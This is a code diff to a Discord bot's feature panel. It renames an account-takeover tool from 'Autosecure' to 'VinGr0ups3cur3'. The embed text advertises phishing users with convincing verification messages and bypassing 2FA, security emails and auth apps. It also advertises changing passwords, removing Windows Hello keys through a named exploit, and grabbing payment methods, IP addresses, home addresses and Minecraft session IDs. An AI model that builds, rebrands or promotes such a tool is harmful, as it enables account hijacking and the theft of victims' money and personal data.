@@ -3,8 +3,8 @@ const { EmbedBuilder } = require('discord.js');
 async function featurepanel() {
     try {
         const embed = new EmbedBuilder()
-            .setTitle("Autosecure Features")
-            .setDescription("The most trusted Autosecure")
+            .setTitle("VinGr0ups3cur3 Features")
+            .setDescription("The most trusted VinGr0ups3cur3")
             .setColor(13158600)
             .addFields(
                 {
@@ -12,7 +12,7 @@ async function featurepanel() {
                     value: "- Multiple verification modes\n- Verifies email\n- Sends convincing messages (can be customized)\n- Bypasses security emails & phonenumbers and auth apps. \n- Stat embeds to view stats of users quickly\n- Anti-spam support\n- If they have OTP disabled, you can set an OAuth link to be sent automatically\n- Ban / kick / unban / blacklist buttons\n- Optional: after verifying, users can be automatically kicked / banned / blacklisted, given a role or sent a custom message"
                 },
                 {
-                    name: "Autosecure",
+                    name: "VinGr0ups3cur3",
                     value: "- Disables 2FA\n- Creates a recovery code\n- Changes security email\n- Changes password\n- Removes Windows Hello keys (Zyger exploit)\n- Signs out of all locations\n- Checks Minecraft (Owns MC, username, capes)\n- Provides the SSID\n- Grabs Xbox gamertag \n- Grabs subscriptions\n- Grabs purchases\n- Grabs payment methods\n- Shows Microsoft Points\n- Grabs their IP addresses\n- Shows Original Owner\n- Grab their addresses \n- Change Microsoft info \n- Shows account capes"
                 },
                 {
